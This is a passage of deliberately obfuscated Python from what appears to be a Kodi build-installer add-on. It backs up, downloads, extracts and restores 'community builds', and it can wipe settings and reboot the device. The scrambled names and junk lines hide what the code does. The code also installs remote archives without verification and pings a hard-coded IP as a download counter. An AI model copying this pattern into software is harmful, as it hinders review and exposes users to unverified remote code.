   oOoOoo0 = xbmc . translatePath ( os . path . join ( iIo00O , 'Community Builds' , 'My Builds' ) )
   if 4 - 4: ooOo . iii1I11ii1i1
   if not os . path . exists ( oOoOoo0 ) :
    os . makedirs ( oOoOoo0 )
    if 67 - 67: I1ii11iIi11i * o0oOOo0O0Ooo % iIii1I11I1II1 / oOoO0o00OO0
   IiI1Iii1 = Ooooo ( heading = "Enter a name for this backup" )
   if 34 - 34: ooOo - II111iiii - o0oOOo0O0Ooo + oo0oooooO0 + iI1iiIiiII
   if ( not IiI1Iii1 ) :
    return False , 0
    if 70 - 70: OoooooooOO + OoO0O00 * Oo0Ooo
   ooOoO = urllib . quote_plus ( IiI1Iii1 )
   ii1iII = xbmc . translatePath ( os . path . join ( oOoOoo0 , ooOoO + '.zip' ) )
   O00oo = [ 'plugin.program.totalinstaller' , 'plugin.program.tbs' ]
   OoOoooO000OO = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , 'Thumbs.db' , '.gitignore' ]
   i11i11 = "Creating full backup of existing build"
   Ii11Iii = "Archiving..."
   ooo00OoOO0o = ""
   oo0O0o = "Please Wait"
   iIIi1iI1I1IIi ( II , ii1iII , i11i11 , Ii11Iii , ooo00OoOO0o , oo0O0o , O00oo , OoOoooO000OO )
   if 20 - 20: i11iIiiIii - II111iiii - OOo00O0 % ooOo . OOo00O0
   if 50 - 50: iIii1I11I1II1 + iI1iiIiiII - iii1I11ii1i1 - OoooooooOO
 if video == 'fresh' :
  oO00O0oO ( 'CB' )
  if 69 - 69: Oo + Oo * OO0oo0oOO * iii1I11ii1i1 + I1IiiI
 O00ooOo = open ( Ooo0OO0oOO , mode = 'w+' )
 if 46 - 46: Oo
 if oooO000Oo000O != i1111I :
  O00ooOo . write ( 'id="' + str ( iiiIIi ) + '"\nname="' + OOoOo0O00oo + ' [COLOR=yellow](Partially installed)[/COLOR]"\nversion="' + i1Ii11I1II + '"\ngui="' + i1111I + '"' )
  if 17 - 17: iii1I11ii1i1 / II111iiii * o0oOOo0O0Ooo / Oo0Ooo + oo0oooooO0 . ooOo
 else :
  O00ooOo . write ( 'id="' + str ( iiiIIi ) + '"\nname="' + OOoOo0O00oo + '"\nversion="' + i1Ii11I1II + '"\ngui="' + i1111I + '"' )
 O00ooOo . close ( )
 if 19 - 19: Oo * iii1I11ii1i1
 if 85 - 85: i1IIi % o0oOOo0O0Ooo * I1ii11iIi11i * OoO0O00 . II111iiii
 if video == 'libprofile' or video == 'library' or video == 'updatelibprofile' or video == 'updatelibrary' :
  try :
   shutil . copytree ( II11iiii1Ii , Oo0OoO00oOO0o , symlinks = False , ignore = shutil . ignore_patterns ( "Textures13.db" , "Addons16.db" , "Addons15.db" , "saltscache.db-wal" , "saltscache.db-shm" , "saltscache.db" , "onechannelcache.db" ) )
   if 69 - 69: OO0oo0oOO / iI1iiIiiII % iI1iiIiiII / OOo00O0 + iI1iiIiiII / i1IIi
  except :
   IIiI11i111i = xbmcgui . Dialog ( ) . yesno ( name , 'There was an error trying to backup some databases. Continuing may wipe your existing library. Do you wish to continue?' , nolabel = 'No, cancel' , yeslabel = 'Yes, overwrite' )
   if 70 - 70: Oo - oOoO0o00OO0 . iI1iiIiiII
   if IIiI11i111i == 0 :
    return
    if 11 - 11: i11iIiiIii + o0oOOo0O0Ooo - iI1iiIiiII * i11iIiiIii - I1IiiI
  ii1iII = xbmc . translatePath ( os . path . join ( iIo00O , 'Database.zip' ) )
  iIIIiIi1I1i ( Oo0OoO00oOO0o , ii1iII )
  if 49 - 49: i1IIi % ooOo / Oo . I1ii11iIi11i - iI1iiIiiII
 if IIiI11i111i == 0 :
  return
  if 12 - 12: i11iIiiIii + iii1I11ii1i1 - I1ii11iIi11i
 time . sleep ( 1 )
 if 27 - 27: oo0oooooO0
 if 22 - 22: OoOoOO00 / I1IiiI
 iI11I1IiI1 = xbmc . translatePath ( os . path . join ( II , '..' , 'koditemp.zip' ) )
 time . sleep ( 2 )
 iiI1IiI . create ( "Community Builds" , "Downloading " + description + " build." , '' , 'Please Wait' )
 II1iOOoOooO0o = os . path . join ( OOO0OOO00oo , description + '.zip' )
 if 5 - 5: oo0oooooO0 / ooOo % OOo00O0 . i11iIiiIii % OoOoOO00 + ooOo
 if not os . path . exists ( OOO0OOO00oo ) :
  os . makedirs ( OOO0OOO00oo )
  if 95 - 95: I1ii11iIi11i
 downloader . download ( url , II1iOOoOooO0o , iiI1IiI )
 if 48 - 48: iii1I11ii1i1
 if 14 - 14: iIii1I11I1II1 / o0oOOo0O0Ooo * oOoO0o00OO0
 if 35 - 35: iIii1I11I1II1
 if 34 - 34: OoO0O00 % I1IiiI . o0oOOo0O0Ooo % OoO0O00 % OoO0O00
 if 30 - 30: I1IiiI + I1IiiI
 if 75 - 75: I1IiiI - OOo00O0 - I1IiiI % ooOo % OoooooooOO
 if 13 - 13: OOo00O0 * OoO0O00 % iIii1I11I1II1 / oOoO0o00OO0 * oo0oooooO0 . Oo0Ooo
 if 23 - 23: OOo00O0 / oOoO0o00OO0 . oo0oooooO0 * OO0oo0oOO
 try :
  oOiIiii1III = open ( I1I , mode = 'r' )
  o00oOOO = oOiIiii1III . read ( )
  oOiIiii1III . close ( )
  if 95 - 95: i11iIiiIii . o0oOOo0O0Ooo + OoooooooOO % Oo0Ooo
 except :
  print "### No profiles detected, most likely a fresh wipe performed"
  if 21 - 21: oo0oooooO0 - o0oOOo0O0Ooo / iii1I11ii1i1 % O0 / iIii1I11I1II1 / oo0oooooO0
 iiI1IiI . close ( )
 iiI1IiI . create ( "Community Builds" , "Checking " , '' , 'Please Wait' )
 if 1 - 1: Oo0Ooo . i11iIiiIii
 if 9 - 9: OoooooooOO / iii1I11ii1i1
 if zipfile . is_zipfile ( II1iOOoOooO0o ) :
  iiI1IiI . update ( 0 , "" , "Extracting Zip Please Wait" )
  O0OoOoO00O ( II1iOOoOooO0o , II , iiI1IiI )
  time . sleep ( 1 )
  if 47 - 47: OoooooooOO
 else :
  O0OoO000O0OO . ok ( 'Not a valid zip file' , 'This file is not a valid zip file, please let the build author know on their support thread so they can amend the download path. It\'s most likely just a simple typo on their behalf.' )
  return
  if 48 - 48: OoOoOO00 . oOoO0o00OO0 % I1IiiI + iii1I11ii1i1
  if 37 - 37: Oo0Ooo + iI1iiIiiII * ooOo / o0oOOo0O0Ooo
  if 78 - 78: oOoO0o00OO0 + iii1I11ii1i1 - o0oOOo0O0Ooo + OoO0O00 / iIii1I11I1II1
 iiI1IiI . create ( "Restoring Dependencies" , "Checking " , '' , 'Please Wait' )
 iiI1IiI . update ( 0 , "" , "Extracting Zip Please Wait" )
 if 47 - 47: Oo
 if O0oo0OO0 == 'true' :
  try :
   print "### Attempting to add back favourites ###"
   O00ooOo = open ( iI , mode = 'w+' )
   O00ooOo . write ( III1II )
   O00ooOo . close ( )
   iiI1IiI . update ( 0 , "" , "Copying Favourites" )
  except : print "### Failed to copy back favourites"
  if 20 - 20: iI1iiIiiII % OOo00O0 - iI1iiIiiII * OoooooooOO / I1ii11iIi11i
 if I1i1iiI1 == 'true' :
  try :
   print "### Attempting to add back sources ###"
   O00ooOo = open ( I1i1I1II , mode = 'w+' )
   O00ooOo . write ( IIII1IiiI )
   O00ooOo . close ( )
   iiI1IiI . update ( 0 , "" , "Copying Sources" )
   if 57 - 57: oOoO0o00OO0 % iii1I11ii1i1 * Oo % I1ii11iIi11i
  except :
   print "### Failed to copy back favourites"
   if 65 - 65: i1IIi - OoooooooOO
 time . sleep ( 1 )
 if os . path . exists ( Oo0OoO00oOO0o ) :
  shutil . rmtree ( Oo0OoO00oOO0o )
  if 66 - 66: I1ii11iIi11i / i1IIi * I1IiiI - OoOoOO00 + ooOo
  if 74 - 74: oo0oooooO0 / iI1iiIiiII / II111iiii - oo0oooooO0 / ooOo % iii1I11ii1i1
  if 19 - 19: oOoO0o00OO0 % OoooooooOO + OoooooooOO
  if 7 - 7: i1IIi
  if 91 - 91: OoOoOO00 - OoOoOO00 . oOoO0o00OO0
  if 33 - 33: iI1iiIiiII - iIii1I11I1II1 / OO0oo0oOO % O0
  if 80 - 80: oOoO0o00OO0 % OoooooooOO - oOoO0o00OO0
  if 27 - 27: iI1iiIiiII - o0oOOo0O0Ooo * I1ii11iIi11i - I1IiiI
  if 22 - 22: Oo0Ooo % OoooooooOO - Oo0Ooo - oo0oooooO0 . OO0oo0oOO
  if 100 - 100: II111iiii / iI1iiIiiII / oo0oooooO0 - I1ii11iIi11i * iIii1I11I1II1
  if 7 - 7: i1IIi . oOoO0o00OO0 % i11iIiiIii * I1ii11iIi11i . iii1I11ii1i1 % I1ii11iIi11i
 iiii1I1 = 'http://120.24.252.100/TI/Community_Builds/downloadcount.php?id=%s' % ( iiiIIi )
 if not 'update' in video :
  iIIIiIi ( iiii1I1 )
  if 35 - 35: I1IiiI
  if 48 - 48: OoooooooOO % OoooooooOO - OoO0O00 . OoOoOO00
 if os . path . exists ( Iii111II ) :
  Oo0oO00 = open ( Iii111II , mode = 'r' )
  O0oiIiiiiI1II1I1 = Oo0oO00 . read ( )
  Oo0oO00 . close ( )
  OOoOoO = re . compile ( 'version="[\s\S]*?"' ) . findall ( O0oiIiiiiI1II1I1 )
  IIIi1I1IIii1II = OOoOoO [ 0 ] if ( len ( OOoOoO ) > 0 ) else ''
  i1iiiIii11 = O0oiIiiiiI1II1I1 . replace ( IIIi1I1IIii1II , 'version="' + i1Ii11I1II + '"' )
  O00ooOo = open ( Iii111II , mode = 'w' )
  O00ooOo . write ( str ( i1iiiIii11 ) )
  O00ooOo . close ( )
  if 22 - 22: OOo00O0 . i11iIiiIii . OoooooooOO . i1IIi
 else :
  O00ooOo = open ( Iii111II , mode = 'w+' )
  O00ooOo . write ( 'date="01011001"\nversion="' + i1Ii11I1II + '"' )
  O00ooOo . close ( )
  if 12 - 12: OoOoOO00 % Oo + ooOo . O0 % iIii1I11I1II1
  if 41 - 41: OoooooooOO
 if IiiIII111iI == 'false' :
  os . remove ( II1iOOoOooO0o )
  if 13 - 13: iii1I11ii1i1 + iI1iiIiiII - iI1iiIiiII % ooOo / iii1I11ii1i1
  if 4 - 4: I1IiiI + Oo - oOoO0o00OO0 + oo0oooooO0
  if 78 - 78: OO0oo0oOO
  if 29 - 29: II111iiii
  if 79 - 79: iIii1I11I1II1 - i11iIiiIii + OOo00O0 - II111iiii . iIii1I11I1II1
  if 84 - 84: Oo0Ooo % iii1I11ii1i1 * O0 * iii1I11ii1i1
  if 66 - 66: Oo / iIii1I11I1II1 - OoOoOO00 % O0 . OOo00O0
 if 'prof' in video :
  try :
   iIiIi1i = open ( I1I , mode = 'w+' )
   iIiIi1i . write ( o00oOOO )
   iIiIi1i . close ( )
  except : print "### Failed to write existing profile info back into profiles.xml"
  if 3 - 3: OO0oo0oOO * OOo00O0 . OoO0O00 * OoooooooOO + OoOoOO00 / O0
  if 60 - 60: iii1I11ii1i1
 if video == 'library' or video == 'libprofile' or video == 'updatelibprofile' or video == 'updatelibrary' :
  O0OoOoO00O ( ii1iII , II11iiii1Ii , iiI1IiI )
  if 97 - 97: i11iIiiIii * iIii1I11I1II1 / II111iiii
  if 66 - 66: II111iiii + oo0oooooO0 * ooOo % iii1I11ii1i1 / i1IIi / iIii1I11I1II1
  if IIiI11i111i != 1 :
   shutil . rmtree ( Oo0OoO00oOO0o )
 iiI1IiI . close ( )
 if 62 - 62: OoOoOO00 + ooOo * oOoO0o00OO0 + O0 / Oo + OOo00O0
 if 38 - 38: i1IIi / iIii1I11I1II1 + oo0oooooO0
 if os . path . exists ( O0o0O00Oo0o0 ) :
  IIiIi11iiIi ( description )
  if 26 - 26: I1ii11iIi11i . OO0oo0oOO % o0oOOo0O0Ooo
  try :
   os . remove ( O0o0O00Oo0o0 )
   if 4 - 4: iI1iiIiiII
  except :
   print "##' Failed to remove: " + O0o0O00Oo0o0
   if 80 - 80: Oo0Ooo . O0 % o0oOOo0O0Ooo . o0oOOo0O0Ooo
  try :
   shutil . rmtree ( OOoOO0oo0ooO )
   if 52 - 52: OoO0O00 % i11iIiiIii . OOo00O0 % OoOoOO00 % OoooooooOO
  except :
   print "##' Failed to remove: " + OOoOO0oo0ooO
   if 5 - 5: OoOoOO00 / O0 / i11iIiiIii
 else : print "### Community Builds - using an old build"
 if 88 - 88: II111iiii - oo0oooooO0 / OoooooooOO
 if 71 - 71: I1ii11iIi11i
 if oooO000Oo000O != i1111I :
  print "### GUI SIZE DIFFERENT ATTEMPTING MERGE ###"
  IIIIiiii = os . path . join ( II , 'newbuild' )
  if 20 - 20: i1IIi * oo0oooooO0 + OoO0O00 * OoO0O00 / Oo0Ooo
  if not os . path . exists ( IIIIiiii ) :
   os . makedirs ( IIIIiiii )
   if 83 - 83: I1ii11iIi11i
  os . makedirs ( Oo0oOOo )
  time . sleep ( 1 )
  iii11i1i1 ( guisettingslink , video )
  time . sleep ( 1 )
  xbmc . executebuiltin ( 'UnloadSkin()' )
  time . sleep ( 1 )
  xbmc . executebuiltin ( 'ReloadSkin()' )
  time . sleep ( 1 )
  O0OoO000O0OO . ok ( "Force Close Required" , "If you\'re seeing this message it means the force close was unsuccessful. Please close XBMC/Kodi via your operating system or pull the power." )
  if 53 - 53: OoOoOO00 % OOo00O0 . OoO0O00 + I1IiiI / I1ii11iIi11i
 if oooO000Oo000O == i1111I :
  O0OoO000O0OO . ok ( 'Successfully Updated' , 'Congratulations the following build:[COLOR=dodgerblue]' , description , '[/COLOR]has been successfully updated!' )
  if 76 - 76: I1ii11iIi11i . iIii1I11I1II1 - i11iIiiIii / I1ii11iIi11i - o0oOOo0O0Ooo
  if 95 - 95: iii1I11ii1i1
def Oooo0o0oO ( url ) :
 O000OOOoO00OOo = 0
 IIiI11i111i = 0
 print "Restore Location: " + url
 if 42 - 42: i1IIi . i11iIiiIii / OoOoOO00
 ooo0O0OOo0OoO ( 'noobsandnerds.xml' )
 if 27 - 27: I1IiiI / OoooooooOO
 III1II1i ( )
 if 74 - 74: I1ii11iIi11i % iI1iiIiiII - OoO0O00 * iii1I11ii1i1 . OoooooooOO * OoO0O00
 if url == 'local' :
  O0O0o0o0OOooo = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the backup file you want to restore' , 'files' , '.zip' , False , False , iIo00O )
  if O0O0o0o0OOooo == '' :
   O000OOOoO00OOo = 1
   if 99 - 99: OoOoOO00 . oo0oooooO0 - OoooooooOO - O0
 if O000OOOoO00OOo == 1 :
  print "### No file selected, quitting restore process ###"
  return
  if 6 - 6: Oo
 if url != 'local' :
  iiI1IiI . create ( "Community Builds" , "Downloading build." , '' , 'Please Wait' )
  O0O0o0o0OOooo = os . path . join ( OOO0OOO00oo , O00OIiIIiIiIIiI ( ) + '.zip' )
  if 3 - 3: O0 - iI1iiIiiII * OO0oo0oOO * Oo / OO0oo0oOO
  if not os . path . exists ( OOO0OOO00oo ) :
   os . makedirs ( OOO0OOO00oo )
   if 58 - 58: OO0oo0oOO * iIii1I11I1II1 + OOo00O0 . OOo00O0
  downloader . download ( url , O0O0o0o0OOooo , iiI1IiI )
  if 74 - 74: OOo00O0 - o0oOOo0O0Ooo * oOoO0o00OO0 % OOo00O0
 if os . path . exists ( ooOooo000oOO ) :
  if os . path . exists ( O00o0OO ) :
   os . remove ( ooOooo000oOO )
  else :
   os . rename ( ooOooo000oOO , O00o0OO )
   if 93 - 93: iIii1I11I1II1 / OoOoOO00 % Oo0Ooo * iI1iiIiiII - OoO0O00 - o0oOOo0O0Ooo
 if os . path . exists ( I11i1 ) :
  os . remove ( I11i1 )
  if 44 - 44: OoooooooOO
  if 82 - 82: OoOoOO00 . OoOoOO00
 if not os . path . exists ( iiii11I ) :
  Oo0oO00 = open ( iiii11I , mode = 'w+' )
  if 10 - 10: Oo0Ooo * I1ii11iIi11i . ooOo . OoooooooOO . Oo * I1ii11iIi11i
 if os . path . exists ( Oo0oOOo ) :
  os . removedirs ( Oo0oOOo )
  if 80 - 80: iI1iiIiiII + iii1I11ii1i1 . iI1iiIiiII + Oo
  if 85 - 85: i11iIiiIii . iii1I11ii1i1 + OO0oo0oOO / OO0oo0oOO
 try :
  os . rename ( O00o0OO , ooOooo000oOO )
  if 43 - 43: oOoO0o00OO0 . OoooooooOO - II111iiii
 except :
  O0OoO000O0OO . ok ( "NO GUISETTINGS!" , 'No guisettings.xml file has been found.' , 'Please exit XBMC and try again' , '' )
  return
  if 90 - 90: I1IiiI - iIii1I11I1II1 + I1ii11iIi11i * Oo * ooOo
 i1II = xbmcgui . Dialog ( ) . yesno ( ooO , 'We highly recommend backing up your existing build before installing any builds. Would you like to perform a backup first?' , nolabel = 'Backup' , yeslabel = 'Install' )
 if i1II == 0 :
  oOoOoo0 = xbmc . translatePath ( os . path . join ( iIo00O , 'Community Builds' , 'My Builds' ) )
  if 19 - 19: iI1iiIiiII * II111iiii % Oo0Ooo - i1IIi
  if not os . path . exists ( oOoOoo0 ) :
   os . makedirs ( oOoOoo0 )
   if 27 - 27: OoOoOO00 . O0 / I1ii11iIi11i . iIii1I11I1II1
  IiI1Iii1 = Ooooo ( heading = "Enter a name for this backup" )
  if ( not IiI1Iii1 ) :
   return False , 0
   if 15 - 15: OO0oo0oOO + OoO0O00 % iIii1I11I1II1 - I1ii11iIi11i - i1IIi % o0oOOo0O0Ooo
  ooOoO = urllib . quote_plus ( IiI1Iii1 )
  ii1iII = xbmc . translatePath ( os . path . join ( oOoOoo0 , ooOoO + '.zip' ) )
  O00oo = [ I1IiI ]
  OoOoooO000OO = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' , '.gitignore' ]
  i11i11 = "Creating full backup of existing build"
  Ii11Iii = "Archiving..."
  ooo00OoOO0o = ""
  oo0O0o = "Please Wait"
  if 54 - 54: oOoO0o00OO0 - II111iiii . OOo00O0 + OO0oo0oOO
  iIIi1iI1I1IIi ( II , ii1iII , i11i11 , Ii11Iii , ooo00OoOO0o , oo0O0o , O00oo , OoOoooO000OO )
 IIiii1I = xbmcgui . Dialog ( ) . yesno ( ooO , 'Would you like to keep your existing database files or overwrite? Overwriting will wipe any existing music or video library you may have scanned in.' , nolabel = 'Overwrite' , yeslabel = 'Keep Existing' )
 if IIiii1I == 1 :
  if os . path . exists ( Oo0OoO00oOO0o ) :
   shutil . rmtree ( Oo0OoO00oOO0o )
   if 76 - 76: OO0oo0oOO + oo0oooooO0 - oOoO0o00OO0 * iIii1I11I1II1 % i1IIi
  try :
   shutil . copytree ( II11iiii1Ii , Oo0OoO00oOO0o , symlinks = False , ignore = shutil . ignore_patterns ( "Textures13.db" , "Addons16.db" , "Addons15.db" , "saltscache.db-wal" , "saltscache.db-shm" , "saltscache.db" , "onechannelcache.db" ) )
   if 72 - 72: OOo00O0 + II111iiii . O0 - oo0oooooO0 / OoooooooOO . iI1iiIiiII
  except :
   IIiI11i111i = xbmcgui . Dialog ( ) . yesno ( ooO , 'There was an error trying to backup some databases. Continuing may wipe your existing library. Do you wish to continue?' , nolabel = 'No, cancel' , yeslabel = 'Yes, overwrite' )
   if IIiI11i111i == 1 : pass
   if IIiI11i111i == 0 : O000OOOoO00OOo = 1 ; return
   if 28 - 28: iIii1I11I1II1 . O0
  ii1iII = xbmc . translatePath ( os . path . join ( iIo00O , 'Database.zip' ) )
  iIIIiIi1I1i ( Oo0OoO00oOO0o , ii1iII )
  if 32 - 32: OoooooooOO
 if O000OOOoO00OOo == 1 :
  print "### Chose to exit restore function ###"
  return
  if 29 - 29: I1ii11iIi11i
 else :
  time . sleep ( 1 )
  IiiII = open ( O0o0Oo , mode = 'r' )
  I1ii1iI = IiiII . read ( )
  IiiII . close ( )
  if 41 - 41: OO0oo0oOO
  if 49 - 49: OO0oo0oOO % II111iiii . OO0oo0oOO - o0oOOo0O0Ooo - iii1I11ii1i1 * oOoO0o00OO0
  print "### Checking zip file structure ###"
  IiiO0O0O0OOO0o = zipfile . ZipFile ( O0O0o0o0OOooo )
  if 'xbmc.log' in IiiO0O0O0OOO0o . namelist ( ) or 'kodi.log' in IiiO0O0O0OOO0o . namelist ( ) or '.git' in IiiO0O0O0OOO0o . namelist ( ) or '.svn' in IiiO0O0O0OOO0o . namelist ( ) :
   print "### Whoever created this build has used completely the wrong backup method, lets try and fix it! ###"
   O0OoO000O0OO . ok ( 'Fixing Bad Zip' , 'Whoever created this build has used the wrong backup method, please wait while we fix it - this could take some time! Click OK to proceed' )
   oO00oooo0OOo = zipfile . ZipFile ( O0O0o0o0OOooo , 'r' )
   oO0Oo0oOo = os . path . join ( OOO0OOO00oo , 'fixed.zip' )
   II1oOO0O0Ooo0 = zipfile . ZipFile ( oO0Oo0oOo , 'w' )
   if 7 - 7: OO0oo0oOO - i1IIi % OoO0O00 / iIii1I11I1II1 % o0oOOo0O0Ooo
   iiI1IiI . create ( "Fixing Build" , "Checking " , '' , 'Please Wait' )
   if 26 - 26: OoOoOO00 . I1ii11iIi11i . Oo
   for iiOo0 in oO00oooo0OOo . infolist ( ) :
    buffer = oO00oooo0OOo . read ( iiOo0 . filename )
    iIiiII11 = str ( iiOo0 . filename )
    if 75 - 75: OoOoOO00 + OO0oo0oOO . i11iIiiIii / OO0oo0oOO
    if ( iiOo0 . filename [ - 4 : ] != '.log' ) and not '.git' in iIiiII11 and not '.svn' in iIiiII11 :
     II1oOO0O0Ooo0 . writestr ( iiOo0 , buffer )
     iiI1IiI . update ( 0 , "Fixing..." , '[COLOR yellow]%s[/COLOR]' % iiOo0 . filename , 'Please Wait' )
     if 32 - 32: OO0oo0oOO + oOoO0o00OO0 + I1ii11iIi11i
   iiI1IiI . close ( )
   II1oOO0O0Ooo0 . close ( )
   oO00oooo0OOo . close ( )
   O0O0o0o0OOooo = oO0Oo0oOo
   if 79 - 79: i1IIi / OO0oo0oOO
  iiI1IiI . create ( "Restoring Backup Build" , "Checking " , '' , 'Please Wait' )
  iiI1IiI . update ( 0 , "" , "Extracting Zip Please Wait" )
  if 81 - 81: iIii1I11I1II1
  try :
   O0OoOoO00O ( O0O0o0o0OOooo , II , iiI1IiI )
  except :
   O0OoO000O0OO . ok ( 'ERROR IN BUILD ZIP' , 'Please contact the build author, there are errors in this zip file that has caused the install process to fail. Most likely cause is it contains files with special characters in the name.' )
   return
   if 86 - 86: oOoO0o00OO0 % oOoO0o00OO0 % OoooooooOO
  time . sleep ( 1 )
  if 42 - 42: Oo0Ooo . ooOo + O0 / Oo % OoooooooOO
  if IIiii1I == 1 :
   O0OoOoO00O ( ii1iII , II11iiii1Ii , iiI1IiI )
   if 19 - 19: OOo00O0 / OO0oo0oOO
   if IIiI11i111i != 1 :
    shutil . rmtree ( Oo0OoO00oOO0o )
    if 43 - 43: OoOoOO00 % OO0oo0oOO + Oo0Ooo - OoooooooOO . O0 % Oo0Ooo
  OOOOo00oOOO00 = open ( O0o0Oo , mode = 'w+' )
  OOOOo00oOOO00 . write ( I1ii1iI )
  OOOOo00oOOO00 . close ( )
  try :
   os . rename ( O00o0OO , I11i1 )
   if 13 - 13: I1ii11iIi11i / OoO0O00 * i11iIiiIii % OoO0O00 % OoO0O00 * II111iiii
  except :
   print "NO GUISETTINGS DOWNLOADED"
   if 17 - 17: iii1I11ii1i1 . O0 * i1IIi - OoOoOO00 % i1IIi
  time . sleep ( 1 )
  Oo0oO00 = open ( ooOooo000oOO , mode = 'r' )
  O0oiIiiiiI1II1I1 = Oo0oO00 . read ( )
  Oo0oO00 . close ( )
  Oo0OOOO0oOoo0 = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( O0oiIiiiiI1II1I1 )
  I1iIIIiiii = Oo0OOOO0oOoo0 [ 0 ] if ( len ( Oo0OOOO0oOoo0 ) > 0 ) else ''
  O0OIIII1i = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( O0oiIiiiiI1II1I1 )
  I1111 = O0OIIII1i [ 0 ] if ( len ( O0OIIII1i ) > 0 ) else ''
  i1I1Iiii = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( O0oiIiiiiI1II1I1 )
  o00oO0o0oo0O = i1I1Iiii [ 0 ] if ( len ( i1I1Iiii ) > 0 ) else ''
  if 35 - 35: OO0oo0oOO + I1ii11iIi11i . ooOo * Oo0Ooo
  try :
   OooO0O0Ooo = open ( I11i1 , mode = 'r' )
   oO0O = OooO0O0Ooo . read ( )
   OooO0O0Ooo . close ( )
   oooO00oo0 = re . compile ( '<skinsettings>[\s\S]*?<\/skinsettings>' ) . findall ( oO0O )
   iiI1 = oooO00oo0 [ 0 ] if ( len ( oooO00oo0 ) > 0 ) else ''
   o000 = re . compile ( '<skin default[\s\S]*?<\/skin>' ) . findall ( oO0O )
   iii11i1 = o000 [ 0 ] if ( len ( o000 ) > 0 ) else ''
   oOiiIIIII = re . compile ( '<lookandfeel>[\s\S]*?<\/lookandfeel>' ) . findall ( oO0O )
   IIi = oOiiIIIII [ 0 ] if ( len ( oOiiIIIII ) > 0 ) else ''
   i1iiiIii11 = O0oiIiiiiI1II1I1 . replace ( I1iIIIiiii , iiI1 ) . replace ( o00oO0o0oo0O , IIi ) . replace ( I1111 , iii11i1 )
   O00ooOo = open ( ooOooo000oOO , mode = 'w+' )
   O00ooOo . write ( str ( i1iiiIii11 ) )
   O00ooOo . close ( )
   if 27 - 27: iIii1I11I1II1 / OO0oo0oOO - oOoO0o00OO0 - Oo0Ooo
  except :
   print "NO GUISETTINGS DOWNLOADED"
   if 76 - 76: Oo . I1IiiI + Oo + iIii1I11I1II1 + oOoO0o00OO0 / iIii1I11I1II1
  if os . path . exists ( O00o0OO ) :
   os . remove ( O00o0OO )
   if 95 - 95: iii1I11ii1i1
  os . rename ( ooOooo000oOO , O00o0OO )
  try :
   os . remove ( I11i1 )
   if 45 - 45: iii1I11ii1i1 - Oo * oo0oooooO0 - OoO0O00 . OO0oo0oOO
  except :
   pass
   if 77 - 77: ooOo / iii1I11ii1i1
  os . makedirs ( Oo0oOOo )
  time . sleep ( 1 )
  o0OOOoOO00o ( )
  if 49 - 49: oOoO0o00OO0
  if 56 - 56: O0 / iii1I11ii1i1 + Oo
  if 7 - 7: Oo0Ooo - i11iIiiIii / ooOo / ooOo . i1IIi % iii1I11ii1i1
  if 51 - 51: ooOo
  if 23 - 23: i11iIiiIii * oOoO0o00OO0 * iii1I11ii1i1 % iii1I11ii1i1 - OoOoOO00 + II111iiii
  if 91 - 91: OoooooooOO + iI1iiIiiII / II111iiii * oo0oooooO0 + o0oOOo0O0Ooo / Oo0Ooo
  if 7 - 7: iii1I11ii1i1 / i11iIiiIii - OO0oo0oOO % oo0oooooO0
  if 67 - 67: iIii1I11I1II1 - OoOoOO00
  if 51 - 51: iii1I11ii1i1 * I1ii11iIi11i % I1ii11iIi11i + o0oOOo0O0Ooo
  if 16 - 16: O0 % I1IiiI * iIii1I11I1II1 - II111iiii + iIii1I11I1II1 + Oo0Ooo
  if 4 - 4: iii1I11ii1i1
  if 60 - 60: II111iiii + iI1iiIiiII / ooOo % OoooooooOO - i1IIi
  if 57 - 57: OOo00O0
  if 99 - 99: Oo0Ooo + iI1iiIiiII % OOo00O0 - o0oOOo0O0Ooo
  if 52 - 52: I1ii11iIi11i
  if 93 - 93: oo0oooooO0 . i11iIiiIii
  if 24 - 24: Oo . OoO0O00 + iI1iiIiiII . ooOo - I1ii11iIi11i % oo0oooooO0
  if 49 - 49: O0 . Oo0Ooo / OO0oo0oOO
  if 29 - 29: I1ii11iIi11i / ooOo * O0 - i11iIiiIii - OoO0O00 + OO0oo0oOO
def oo0OO0oo ( ) :
 III1II1i ( )
 Oo0O = xbmcgui . Dialog ( ) . browse ( 1 , 'Select the guisettings zip file you want to restore' , 'files' , '.zip' , False , False , iIo00O )
 if 84 - 84: OoooooooOO . i11iIiiIii % OoO0O00 * Oo0Ooo / oo0oooooO0
 if Oo0O == '' :
  return
  if 95 - 95: OoO0O00 - i11iIiiIii . OoO0O00 % Oo * O0 + i11iIiiIii
 else :
  I1i1iI11ii = 1
  OO0OOOOOo ( Oo0O , I1i1iI11ii )
  if 65 - 65: O0 / oo0oooooO0 . i1IIi * oo0oooooO0 / iIii1I11I1II1 - ooOo
  if 93 - 93: OoOoOO00 % i11iIiiIii - OO0oo0oOO % OoO0O00
def oOOo0OOOOOoO ( url , name ) :
 i1II = xbmcgui . Dialog ( ) . yesno ( 'Full Wipe And New Install' , 'This is a great option for first time install or if you\'re encountering any issues with your device. This will wipe all your Kodi settings, do you wish to continue?' , nolabel = 'Cancel' , yeslabel = 'Accept' )
 if i1II == 0 :
  return
  if 69 - 69: O0 % oo0oooooO0 . Oo0Ooo + oo0oooooO0
 elif i1II == 1 :
  OOI11 = '/storage/.restore/'
  iI1i1IiIIIIi = os . path . join ( OOI11 , '20141128094249.tar' )
  if not os . path . exists ( OOI11 ) :
   try :
    os . makedirs ( OOI11 )
   except :
    pass
  downloader . download ( url , iI1i1IiIIIIi )
  time . sleep ( 2 )
  if 36 - 36: I1ii11iIi11i - OoooooooOO % OOo00O0 . i11iIiiIii - oOoO0o00OO0 * Oo0Ooo
  iiii1I1 = 'http://120.24.252.100/TI/Community_Builds/downloadcount.php?id=%s' % ( name )
  try :
   iIIIiIi ( iiii1I1 )
  except :
   pass
   if 14 - 14: OoOoOO00
  O0OoO000O0OO . ok ( "Download Complete - Press OK To Reboot" , 'Once you press OK your device will attempt to reboot, if it hasn\'t rebooted within 30 seconds please pull the power to manually shutdown. When booting you may see lines of text, don\'t worry this is normal update behaviour!' )
  xbmc . executebuiltin ( 'Reboot' )
